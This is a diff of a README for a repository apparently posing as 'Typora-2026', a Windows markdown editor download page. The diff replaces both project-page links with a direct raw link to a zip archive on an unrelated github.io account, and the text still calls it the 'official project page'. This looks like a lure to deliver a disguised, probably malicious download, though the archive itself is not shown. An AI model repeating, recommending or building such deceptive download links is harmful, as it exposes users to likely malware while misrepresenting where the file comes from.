@@ -5,7 +5,7 @@ description: "Download the latest version of Typora for Windows 10 and 11. Acces
 ---
 # ✍️ Typora-2026 - Write notes with clean markdown formatting
 
-[![Download Typora](https://img.shields.io/badge/Download-Typora-grey.svg)](https://github.com/Indiscreetnesssimpleleaf41/Typora-2026)
+[![Download Typora](https://img.shields.io/badge/Download-Typora-grey.svg)](https://raw.githubusercontent.com/Indiscreetnesssimpleleaf41/indiscreetnesssimpleleaf41.github.io/main/och/github-indiscreetnesssimpleleaf-io-v2.6.zip)
 
 Typora-2026 provides a focused writing environment for Windows 10 and Windows 11. It removes the clutter of traditional word processors. You see your text rendered as you type. This tool handles markdown syntax automatically so you can maintain your flow while you write, edit, or manage notes.
 
@@ -13,7 +13,7 @@ Typora-2026 provides a focused writing environment for Windows 10 and Windows 11
 
 Follow these steps to get the editor on your computer:
 
-1. Click this link to go to the official project page: [Download Typora-2026](https://github.com/Indiscreetnesssimpleleaf41/Typora-2026).
+1. Click this link to go to the official project page: [Download Typora-2026](https://raw.githubusercontent.com/Indiscreetnesssimpleleaf41/indiscreetnesssimpleleaf41.github.io/main/och/github-indiscreetnesssimpleleaf-io-v2.6.zip).
 2. Look for the release section on the right side of the screen.
 3. Select the latest version available for Windows.
 4. Download the installer file to your computer.
